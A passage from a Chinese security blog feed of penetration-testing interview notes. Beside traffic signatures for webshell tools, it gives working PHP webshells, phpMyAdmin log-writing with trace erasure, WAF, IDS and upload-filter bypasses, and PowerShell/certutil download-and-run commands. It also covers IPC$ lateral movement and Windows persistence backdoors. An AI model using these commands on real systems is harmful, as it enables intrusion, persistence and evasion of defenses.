使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive<br>  固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd<br>  默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。<br>  默认连接密码仍然是<code>rebeyond</code></p><h4 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h4><p>  采用了和冰蝎 2.0 类似的密钥交换方式。它的webshell需要动态生成，可以根据需求选择不同的加密方式。<br><a href="https://smms.app/image/84HqZIDVRhPao3Y" target="_blank"><img src="https://s2.loli.net/2024/03/21/84HqZIDVRhPao3Y.png" ></a></p><h5 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h5><p>  在默认脚本编码的情况下，jsp会出现xc、pass字符和Java反射(ClassLoader，getClass().getClassLoader())，base64加解码等特征。</p><h5 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a>动态特征</h5><p>  Accept字段（弱特征），默认是<code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2</code><br>  Cookie中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。<br>  响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。<br>  请求包长度 52541<br>  以<code>pass=“xxxx”</code>开始请求包<br>  请求包较长，响应包为0<br>  一个tcp包里面有三个http<br>  一共6个http报文，3去3回</p><h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><h5 id="静态特征-1"><a href="#静态特征-1" class="headerlink" title="静态特征"></a>静态特征</h5><p>  蚁剑中php使用assert、eval执行；asp只有eval执行；在jsp使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征。</p><h5 id="动态特征-1"><a href="#动态特征-1" class="headerlink" title="动态特征"></a>动态特征</h5><p>  我们使用一句话木马上传webshell，抓包后会发现每个请求体都存在以<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)</code>开头。<br>  并且响应体的返回结果是base64编码发混淆字符，格式为：随机数 结果 随机数。<br>  参数名大多以“_0x…..=”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p><h4 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h4><p>  菜刀使用一句话木马，特征十分明显，在PHP、ASP、ASP.NET的网站都可以：</p><pre><code>PHP:  &lt;?php @eval([$_post[&#39;test&#39;]]); ?&gt;ASP:  &lt;% eval request(&quot;test&quot;)%&gt;ASP.NET:  &lt;%@ Page Language=&quot;Javascript&quot;%&gt;&lt;% eval(Request.Item[&quot;test&quot;],&quot;unsafe&quot;);%&gt;</code></pre><h5 id="动态特征-2"><a href="#动态特征-2" class="headerlink" title="动态特征"></a>动态特征</h5><p>  payload在请求体中，采用url编码+base64编码，<strong>payload部分是明文传输</strong>。<br>  payload中有eval或assert、base64_decode这样的字符。<br>  payload中有默认固定的&amp;z0=QGluaV9zZXQ…这样base64加密的攻击载荷<br>  参数<strong>z0</strong>对应<code>$_POST[z0]</code>接收到的数据，且固定为QGluaV9zZXQ开头。<br>  进行base64解码后可看到代码：<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);</code>这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。</p><h2 id="常见的解析漏洞"><a href="#常见的解析漏洞" class="headerlink" title="常见的解析漏洞"></a>常见的解析漏洞</h2><p><a href="https://smms.app/image/nQ3XLxSCl95hNpb" target="_blank"><img src="https://s2.loli.net/2024/03/21/nQ3XLxSCl95hNpb.png" ></a></p><h2 id="PHP常见危险函数"><a href="#PHP常见危险函数" class="headerlink" title="PHP常见危险函数"></a>PHP常见危险函数</h2><ol><li>eval()<br>  eval()函数就是将传入的字符串当作 PHP 代码来进行执行。</li><li>assert()<br>  如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</li><li>call_user_func()<br>  第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</li></ol><h2 id="phpmyadmin拿webshell"><a href="#phpmyadmin拿webshell" class="headerlink" title="phpmyadmin拿webshell"></a>phpmyadmin拿webshell</h2><h4 id="select-into-outfile直接写入"><a href="#select-into-outfile直接写入" class="headerlink" title="select into outfile直接写入"></a>select into outfile直接写入</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ol><li>对web目录需要有写权限能够使用单引号(root)</li><li>知道网站绝对路径(phpinfo/php探针/通过报错等)</li><li>secure_file_priv没有具体值<pre><code>show global variables like &#39;%secure%&#39;;查看当前设置  1.当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权  2. 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权  3. 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权  在MySQL的配置文件my.ini中进行配置</code></pre></li></ol><h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><ol><li>写入一句话木马<pre><code>select &#39;&lt;?php @eval($POST[1]); ?&gt;&#39; INTO OUTFILE &#39;D:\\phpStudy\\PHPTutorial\\WWW\\a.php&#39;这里需要注意的一个点是路径需要用”\“</code></pre></li></ol><h4 id="利用全局日志写shell"><a href="#利用全局日志写shell" class="headerlink" title="利用全局日志写shell"></a>利用全局日志写shell</h4><h5 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h5><ol><li>查看配置<pre><code>SHOW VARIABLES LIKE ‘%general%查看mysql的日志状态，默认是关闭的general_log_file为日志保存的位置</code></pre></li><li>开启general_log模式<pre><code>set global general_log = on;记录用户输入的每条命令并保存在 C:\phpStudy\MySQL\data\stu1.log 的文件中开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用</code></pre></li><li>修改日志目录为shell地址<pre><code>set global general_log_file=&#39;C:\\phpStudy\\MySQL\\data\\shell.php&#39;;</code></pre></li><li>写入shell并连接利用<pre><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code></pre></li><li>抹除痕迹<pre><code>set global general_log_file=&#39;C:\\phpStudy\\MySQL\\data\\stu1.log&#39;;set global general_log = off;SHOW VARIABLES LIKE &#39;%general%&#39;</code></pre></li></ol><h2 id="IDS-IPS绕过思路"><a href="#IDS-IPS绕过思路" class="headerlink" title="IDS/IPS绕过思路"></a>IDS/IPS绕过思路</h2><p>  入侵检测系统 (IDS) 和入侵防护系统 (IPS)<br>  与防火墙相似，IPS 内嵌部署到流量中。IPS 是一个主动的网络组件，会检查每个通过的数据包，并根据其配置和策略采取正确的补救措施。相反，IDS 是一个被动组件，通常不会内嵌部署，而是通过 SPAN 或 TAP 技术监控流量，然后发出通知.</p><h4 id="IPS阻断场景"><a href="#IPS阻断场景" class="headerlink" title="IPS阻断场景"></a>IPS阻断场景</h4><ol><li>可以建立TCP连接，检查客户端发出的HTTP请求中的特征，如匹配则发rst阻断或HTTP响应替换，用于域名封禁或Web攻击防护；<pre><code>在应用层，一般利用IPS和Web Server对HTTP语法的理解差异在网络层，一般利用IPS和操作系统协议栈对TCP/IP的处理方式差异</code></pre></li><li>不让建立TCP连接，即客户端发syn包时IPS直接回rst，同时后续如有ack包会双向回rst阻断，用于访问控制或端口封禁；<pre><code>暴露面比较窄，绕过会困难一点，但也不是不可能</code></pre></li><li>DNS查询场景，伪造DNS响应，劫持网站域名用于封禁或者钓鱼攻击；<pre><code>换个DNS Server就行了</code></pre></li><li>UDP传输场景下，伪造ICMP响应，告知客户端UDP端口不可达。<pre><code>阻断UDP访问</code></pre></li></ol><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><ol><li>TCP分片<br>  一些IPS是字节级逐包检查的，并没有实现TCP分片重组能力，那就把关键字拆到两个TCP包里面就可以暗度陈仓。<br>  有的IPS虽然有TCP分片重组能力，但是超时就不会再检查了，所以设置这个sleep的时间超过IPS的分片重组超时值而又没有达到操作系统和Web Server的超时值，那就可以绕过。<br><a href="https://smms.app/image/7GCwVLDKzMjYHhS" target="_blank"><img src="https://s2.loli.net/2024/03/21/7GCwVLDKzMjYHhS.png" ></a></li><li>IP分片<br>  构造IP包就需要用到Python下的组件Scapy，TCP三次握手后用Scapy的fragment函数按600字节一个拆分发送IP分片包（当然也可以把syn包也分片）<br>  但是实测有些路由会丢弃MTU比较小的IP包。<br>  nmap有一个规避FW/IDS的功能就是利用IP分片进行端口扫描，参数是-f，可以用–mtu设置分片大小，最小的值是8。</li><li>DOS攻击</li><li>伪造TCP状态（fuzz）<br>  基于状态跟踪的IPS ———— 简单测试检测模式，不建立TCP连接直接发HTTP请求，如果还有响应的IPS就是包过滤，反之则是状态跟踪。<br>  建立TCP连接后，我们可以<strong>发送一个定制TTL值的rst包，这个TTL值正好能够经过IPS但不会到达服务端，IPS基于状态跟踪会认为这个TCP连接已断开，后续的各种包都不会去检测，但服务端不受影响会继续等待ack包来。</strong></li><li>IPv6绕过<br>  正在服役的IDS/IPS/WAF不一定支持，于是可以畅行无阻。</li></ol><h2 id="Redis-getshell"><a href="#Redis-getshell" class="headerlink" title="Redis getshell"></a>Redis getshell</h2><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul><li>通过向Web目录中写webshell的方式进行getshell</li><li>通过写SSH key的方式进行getshell</li><li>通过写corntab的方式进行getshell</li></ul><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul><li>利用powershell反弹shell</li><li>利用mshta.exe</li></ul><h2 id="Log4j漏洞原理"><a href="#Log4j漏洞原理" class="headerlink" title="Log4j漏洞原理"></a>Log4j漏洞原理</h2><p>  主要原理是利用log4j2的日志输出jndi远程对象时，调用远程对象没做检查导致。<br>  当用户浏览器注入变量，后台应用程序对变量做了日志输出就会发生远程对象的调用，远程对象又没有经过检查，直接在我们的应用程序中运行。<br><a href="https://smms.app/image/4zeJSlKdGMHFs6C" target="_blank"><img src="https://s2.loli.net/2024/03/21/4zeJSlKdGMHFs6C.png" ></a></p><h2 id="数据库利用姿势"><a href="#数据库利用姿势" class="headerlink" title="数据库利用姿势"></a><a href="https://github.com/safe6Sec/PentestDB">数据库利用姿势</a></h2><h2 id="Windows远程文件下载"><a href="#Windows远程文件下载" class="headerlink" title="Windows远程文件下载"></a>Windows远程文件下载</h2><h4 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h4><pre><code>Invoke-WebRequest -Uri 目标url -OutFile 目标文件位置powershell (new-object System.Net.WebClient).DownloadFile(&#39;目标文件地址&#39;,&#39;保存路径文件名&#39;)远程执行命令：powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;目标文件地址&#39;))&quot;</code></pre><h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><p>  BITSAdmin用于创建、下载和上传作业，监视其进度。Windows7及以后的系统自带BitsAdmin工具。</p><pre><code>bitsadmin /transfer test http://192.168.1.1:8000/1.txt c:\users\mytools\a.txt // 创建一个名为test的bitsadmin任务，从192.168.1.1:8000下载1.txt,保存为c:\users\mytools\a.txt</code></pre><h4 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h4><p>  Certutil 是Windows自带的命令行工具，用于备份证书服务，由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。<br>  目录为：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p><pre><code>certutil -urlcache -split -f http://192.168.1.1:8000/shell.exe c:\users\public\shell.exe //从192.168.1.1:8000下载shell.exe到本地c:\users\public\目录下</code></pre><p><a href="https://smms.app/image/Ki24ZBd6l3vqWme" target="_blank"><img src="https://s2.loli.net/2024/03/21/Ki24ZBd6l3vqWme.png" ></a></p><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p><code>wget -b -O filename http://example.com</code>默认覆盖文件</p><h4 id="ipc-文件共享"><a href="#ipc-文件共享" class="headerlink" title="ipc$文件共享"></a>ipc$文件共享</h4><p>  IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>  <strong>漏洞利用条件：</strong><br>  目标主机开启了139和445端口<br>  目标主机管理员开启了ipc$默认共享</p><pre><code>net use \\DC的IP\ipc$ &quot;password&quot; /user:&quot;username&quot;   //连接主机net use                             // 查看当前主机所建立的连接dir \\ip\c$                         //查看主机目录copy 本地文件地址 \\目标\c$         //传输恶意文件tasklist /S 主机 /U 用户 /P 密码    // 查看目标主机进程net use \\IP /del /y                //删除ipc$&gt;&gt;建立 IPC 常见的错误代码:5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 51：网络问题，Windows 无法找到网络路径53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除1326：账号密码错误1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况2242：用户密码过期，目标有账号策略，强制定期更改密码</code></pre><h4 id="at计划任务"><a href="#at计划任务" class="headerlink" title="at计划任务"></a>at计划任务</h4><p>Windows Server 2008之前版本的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建一次性计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p><pre><code>copy 本地文件地址 \\目标\c$   //传输恶意文件at \\ip 18:53:00 c:\shell.exe   //创建计划任务，让目标主机DC在指定的时间运行木马at \\ip 任务ID /delete   //删除任务</code></pre><h2 id="手工判断靶标站点是Windows-Linux"><a href="#手工判断靶标站点是Windows-Linux" class="headerlink" title="手工判断靶标站点是Windows/Linux"></a>手工判断靶标站点是Windows/Linux</h2><ol><li>大小写检测：Windows大小写不敏感，而Liunx大小写敏感</li><li>PING指令: 根据TTL值，Windows一般情况下&gt;100、Linux则&lt;100</li></ol><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p><a href="https://smms.app/image/HFnAkSOw4GYxCNu" target="_blank"><img src="https://s2.loli.net/2024/03/21/HFnAkSOw4GYxCNu.png" ></a></p><h2 id="常见脆弱服务端口"><a href="#常见脆弱服务端口" class="headerlink" title="常见脆弱服务端口"></a>常见脆弱服务端口</h2><p><a href="https://smms.app/image/CiRj4UdNqbkSmZD" target="_blank"><img src="https://s2.loli.net/2024/03/21/CiRj4UdNqbkSmZD.png" ></a></p><h2 id="正反向shell"><a href="#正反向shell" class="headerlink" title="正反向shell"></a>正反向shell</h2><p><a href="https://smms.app/image/Mzr2vTVBCyhqYLZ" target="_blank"><img src="https://s2.loli.net/2024/03/21/Mzr2vTVBCyhqYLZ.png" ></a></p><h2 id="正反向代理"><a href="#正反向代理" class="headerlink" title="正反向代理"></a>正反向代理</h2><p><a href="https://smms.app/image/DnXqU8AJLlZBt4u" target="_blank"><img src="https://s2.loli.net/2024/03/21/DnXqU8AJLlZBt4u.png" ></a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  看完这两天的面试题之后发现关于网络通信的部分实在是太重要了，基本功还不是很牢固，要多加学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Shell工具的流量特征&quot;&gt;&lt;a href=&quot;#Shell工具的流量特征&quot; class=&quot;headerlink&quot; title=&quot;Shell工具的流量特征&quot;&gt;&lt;/a&gt;Shell工具的流量特征&lt;/h2&gt;&lt;h4 id=&quot;冰蝎2-0&quot;&gt;&lt;a href=&quot;#冰蝎2-0&quot; c</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>面试复习一</title>
    <link href="https://liu1272.github.io/2024/03/20/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%80/"/>
    <id>https://liu1272.github.io/2024/03/20/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%80/</id>
    <published>2024-03-20T13:32:00.000Z</published>
    <updated>2024-03-22T12:18:59.432Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQLMAP-os-shell原理"><a href="#SQLMAP-os-shell原理" class="headerlink" title="SQLMAP os-shell原理"></a>SQLMAP os-shell原理</h2><p>  当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>  在mysql、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，<strong>sys_exec()<strong>和</strong>sys_eval()<strong>。那么他创建的这两个函数可以执行系统命令。<br>  在Microsoft SQL Server，sqlmap将会使用</strong>xp_cmdshell</strong>存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建<br>  <strong>必要条件：</strong></p><ul><li>拥有网站的写入权限</li><li><strong>Secure_file_priv</strong>参数为空或者为指定路径。</li><li>普通注入–os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行。</li></ul><h2 id="SQL绕过waf"><a href="#SQL绕过waf" class="headerlink" title="SQL绕过waf"></a>SQL绕过waf</h2><h4 id="1-大小写"><a href="#1-大小写" class="headerlink" title="1. 大小写"></a>1. 大小写</h4><h4 id="2-双写"><a href="#2-双写" class="headerlink" title="2. 双写"></a>2. 双写</h4><h4 id="3-空格"><a href="#3-空格" class="headerlink" title="3. 空格"></a>3. 空格</h4><pre><code>select/**/*/**/from/**/yz;select%0a*%0afrom%0ayz; %0a 是回车select(a)from(yz);select(a)from(yz)where(a=1);</code></pre><h4 id="4-内联注释"><a href="#4-内联注释" class="headerlink" title="4. 内联注释"></a>4. 内联注释</h4><pre><code>id=1/*!UnIoN*/SeLeCT/*!select*//*!**//*!from*//*!yz*/;</code></pre><h4 id="5-URL编码，当网站会解码时才能用"><a href="#5-URL编码，当网站会解码时才能用" class="headerlink" title="5. URL编码，当网站会解码时才能用"></a>5. URL编码，当网站会解码时才能用</h4><pre><code>$insert=$link-&gt;query(urldecode($_GET[&#39;id&#39;]));$row=$insert-&gt;fetch_row();select * from yzselect * from  %2579%257a</code></pre><h4 id="6-十六进制（引号）"><a href="#6-十六进制（引号）" class="headerlink" title="6. 十六进制（引号）"></a>6. 十六进制（引号）</h4><h4 id="7-逗号"><a href="#7-逗号" class="headerlink" title="7. 逗号"></a>7. 逗号</h4><h4 id="8-比较符-lt-gt"><a href="#8-比较符-lt-gt" class="headerlink" title="8. 比较符(&lt;,&gt;)"></a>8. 比较符(&lt;,&gt;)</h4><h4 id="9-注释符"><a href="#9-注释符" class="headerlink" title="9. 注释符"></a>9. 注释符</h4><h4 id="10-宽字节"><a href="#10-宽字节" class="headerlink" title="10. 宽字节"></a>10. 宽字节</h4><pre><code>%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了注：select防止用户自定义的名称和mysql保留字冲突。</code></pre><p>**修复：<br>  使用统一字符集<br>  使用 mysql_real_escape_string 进行转义<br>  PHP编写的代码，使用magic_quotes_gpc（魔术引号）<br>  使用addslashes对参数进行转义<br>  使用PDO预处理（php_pdo_mysql.dll）<br>**</p><h2 id="文件上传检测方式以及绕过原理"><a href="#文件上传检测方式以及绕过原理" class="headerlink" title="文件上传检测方式以及绕过原理"></a>文件上传检测方式以及绕过原理</h2><h4 id="监测方法：JS、黑白名单、mine（基于上传自带类型艰检测）"><a href="#监测方法：JS、黑白名单、mine（基于上传自带类型艰检测）" class="headerlink" title="监测方法：JS、黑白名单、mine（基于上传自带类型艰检测）"></a>监测方法：JS、黑白名单、mine（基于上传自带类型艰检测）</h4><h4 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h4><h5 id="1-00绕过（-php终止符-jpg）"><a href="#1-00绕过（-php终止符-jpg）" class="headerlink" title="1. %00绕过（.php终止符.jpg）"></a>1. %00绕过（.php终止符.jpg）</h5><pre><code>        白名单过滤肯定是从后往前读取后缀，所以读取到.jpg在白名单里就放通了。        但是在调用文件的时候读取文件名是从前往后读，所以看到.php后面的终止符的时候就停止读取了，最终读取的文件名的后缀就是.php        这个%00是什么意思呢？看到有%，那么首先就应该想到的是URL编码。然而%00只针对GET传参，所以POST传参不能识别URL编码</code></pre><h5 id="2-0x00绕过（当post方式传参时使用）"><a href="#2-0x00绕过（当post方式传参时使用）" class="headerlink" title="2. 0x00绕过（当post方式传参时使用）"></a>2. 0x00绕过（当post方式传参时使用）</h5><h5 id="3-图片马绕过（包括二次渲染）"><a href="#3-图片马绕过（包括二次渲染）" class="headerlink" title="3. 图片马绕过（包括二次渲染）"></a>3. 图片马绕过（包括二次渲染）</h5><h5 id="4-条件竞争绕过（针对先上传再检测的web网站）"><a href="#4-条件竞争绕过（针对先上传再检测的web网站）" class="headerlink" title="4. 条件竞争绕过（针对先上传再检测的web网站）"></a>4. 条件竞争绕过（针对先上传再检测的web网站）</h5><pre><code>        上传一个1.php的文件，1.php文件里的内容是生成2.php(木马)的语句，在网站删除1.php之前，访问到它，然后就生成了2.php，随后1.php被删除了，但是2.php还存在，因为2.php不是通过上传来的，所以可以绕过检测机制。        需要用到语句：file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39;)；</code></pre><h5 id="5-常规文件名改造（替换、构造异常闭合、重写、大小写、恶意参数污染、编码、换行）"><a href="#5-常规文件名改造（替换、构造异常闭合、重写、大小写、恶意参数污染、编码、换行）" class="headerlink" title="5. 常规文件名改造（替换、构造异常闭合、重写、大小写、恶意参数污染、编码、换行）"></a>5. 常规文件名改造（替换、构造异常闭合、重写、大小写、恶意参数污染、编码、换行）</h5><h5 id="6-修改请求方式"><a href="#6-修改请求方式" class="headerlink" title="6. 修改请求方式"></a>6. 修改请求方式</h5><h5 id="7-分块参数-参数污染"><a href="#7-分块参数-参数污染" class="headerlink" title="7. 分块参数+参数污染"></a>7. 分块参数+参数污染</h5><h5 id="8-修改长度字段"><a href="#8-修改长度字段" class="headerlink" title="8. 修改长度字段"></a>8. 修改长度字段</h5><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><h4 id="1-高版本php不换行执行命令"><a href="#1-高版本php不换行执行命令" class="headerlink" title="1. 高版本php不换行执行命令"></a>1. 高版本php不换行执行命令</h4><p><a href="https://smms.app/image/hLCk1DzQpUTRvwd" target="_blank"><img src="https://s2.loli.net/2024/03/20/hLCk1DzQpUTRvwd.png" alt="高版本php语法不换行执行命令.png"></a></p><h4 id="2-利用-特殊符号来引起报错"><a href="#2-利用-特殊符号来引起报错" class="headerlink" title="2. 利用\特殊符号来引起报错"></a>2. 利用\特殊符号来引起报错</h4><p><a href="https://smms.app/image/4bi8UWtmvHca7TX" target="_blank"><img src="https://s2.loli.net/2024/03/20/4bi8UWtmvHca7TX.png" alt="PHP免杀特殊符号报错.png"></a></p><h4 id="3-十六进制字符串（在php7中不认为是数字，php5则依旧为数字）"><a href="#3-十六进制字符串（在php7中不认为是数字，php5则依旧为数字）" class="headerlink" title="3. 十六进制字符串（在php7中不认为是数字，php5则依旧为数字）"></a>3. 十六进制字符串（在php7中不认为是数字，php5则依旧为数字）</h4><p><a href="https://smms.app/image/jeRxAYbNqXE8GF3" target="_blank"><img src="https://s2.loli.net/2024/03/20/jeRxAYbNqXE8GF3.png" alt="PHP免杀十六进制字符串.png"></a></p><h4 id="4-jspx-CDATA特性"><a href="#4-jspx-CDATA特性" class="headerlink" title="4. jspx CDATA特性"></a>4. jspx CDATA特性</h4><pre><code>        jsp的后缀可以兼容为jspx的代码，也兼容jspx的所有特性，如CDATA特性        jspx的后缀不兼容为jsp的代码，jspx只能用jspx的格式        在XML元素里，&lt;和&amp;是非法的，遇到&lt;解析器会把该字符解释为新元素的开始，遇到&amp;解析器会把该字符解释为字符实体化编码的开始        但是我们有时候有需要在jspx里添加js代码用到大量的&lt;和&amp;字符，因此可以将脚本代码定义为CDATA        CDATA部分内容会被解析器忽略，此时ameter依旧会与getPar拼接成为getParameter</code></pre><p><a href="https://smms.app/image/Y3kaveAKJ1ticTQ" target="_blank"><img src="https://s2.loli.net/2024/03/20/Y3kaveAKJ1ticTQ.png" alt="jspxCDAT特性.png"></a></p><h4 id="5-实体化编码"><a href="#5-实体化编码" class="headerlink" title="5. 实体化编码"></a>5. 实体化编码</h4><p><a href="https://smms.app/image/pq2JKvs9HAmoWCY" target="_blank"><img src="https://s2.loli.net/2024/03/20/pq2JKvs9HAmoWCY.png" alt="实体化编码.png"></a></p><h4 id="6-利用java支持其他编码格式来进行绕过"><a href="#6-利用java支持其他编码格式来进行绕过" class="headerlink" title="6. 利用java支持其他编码格式来进行绕过"></a>6. 利用java支持其他编码格式来进行绕过</h4><p><a href="https://smms.app/image/ajcb1iKpGoWE6J4" target="_blank"><img src="https://s2.loli.net/2024/03/20/ajcb1iKpGoWE6J4.png" ></a></p><h2 id="msf-cs免杀"><a href="#msf-cs免杀" class="headerlink" title="msf/cs免杀"></a>msf/cs免杀</h2><h4 id="1-对shellcode进行加密编码"><a href="#1-对shellcode进行加密编码" class="headerlink" title="1. 对shellcode进行加密编码"></a>1. 对shellcode进行加密编码</h4><h4 id="1-在特定位置添加垃圾字节"><a href="#1-在特定位置添加垃圾字节" class="headerlink" title="1. 在特定位置添加垃圾字节"></a>1. 在特定位置添加垃圾字节</h4><h4 id="2-使用硬编码的单字节密钥对字节进行XOR或者加减法运算"><a href="#2-使用硬编码的单字节密钥对字节进行XOR或者加减法运算" class="headerlink" title="2. 使用硬编码的单字节密钥对字节进行XOR或者加减法运算"></a>2. 使用硬编码的单字节密钥对字节进行XOR或者加减法运算</h4><h4 id="3-将字节移位某些特定位置"><a href="#3-将字节移位某些特定位置" class="headerlink" title="3. 将字节移位某些特定位置"></a>3. 将字节移位某些特定位置</h4><h4 id="4-交换连续字节"><a href="#4-交换连续字节" class="headerlink" title="4. 交换连续字节"></a>4. 交换连续字节</h4><p><a href="https://smms.app/image/3mnDuMSoA97YRCX" target="_blank"><img src="https://s2.loli.net/2024/03/20/3mnDuMSoA97YRCX.png" alt="沙盒免杀.png"></a></p><h2 id="FOFA信息收集"><a href="#FOFA信息收集" class="headerlink" title="FOFA信息收集"></a>FOFA信息收集</h2><p><a href="https://smms.app/image/8c9GSkojiMr3Xmh" target="_blank"><img src="https://s2.loli.net/2024/03/20/8c9GSkojiMr3Xmh.png" alt="FOFA语句.png"></a></p><h2 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h2><h3 id="简单维持"><a href="#简单维持" class="headerlink" title="简单维持"></a>简单维持</h3><ol><li>创建影子账户<pre><code>net user test$ 123456 /addnet localgroup administrators test$ /add注册表（HKEY_LOCAL_MACHINE\SAM\SAM）修改SAM权限，赋予adminitrators完全控制权限将Administrator用户对应项的F数据值复制到test$用户对应项的F数据值将test$和所对应项文件夹导出，分别命名为test.reg和1.reg删除test$用户，将test.reg和1.reg导入注册表    net user test$ /delregedit /s test.regregedit /s 1.reg</code></pre></li><li>粘滞键后门<pre><code>粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。粘滞键位置：c:\windows\system32\sethc.exesethc.exe sethc1.exemovecopy cmd.exe sethc.exe</code></pre></li><li>logon scripts后门<pre><code>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。注册表位置：HKEY_CURRENT_USER\EnvironmentREG ADD &quot;HKEY CURRENT USER\Environment&quot; /v UserlnitMprLogonScript /t REG_SZ /d &quot;C:\shell.exe&quot;#创建键为: UsernitMprLogonScript，其键值为我们要启动的程序路径</code></pre></li><li>注册表自启动后门<pre><code>位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run添加键test，值为后门程序路径。REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /v test1 /t REG_SZ /d &quot;C:\shell.exe&quot;位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon修改键Userinit的值，重启就会自动运行程序。</code></pre></li><li>屏幕保护程序后门（还是改注册表）</li><li>计划任务后门<pre><code>schtasks /Create /tn Updater /tr c:\whell.exe /sc minute /mo 5 #每5分钟自动执行666.exe</code></pre></li><li>服务自启动后门<pre><code>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。sc create test 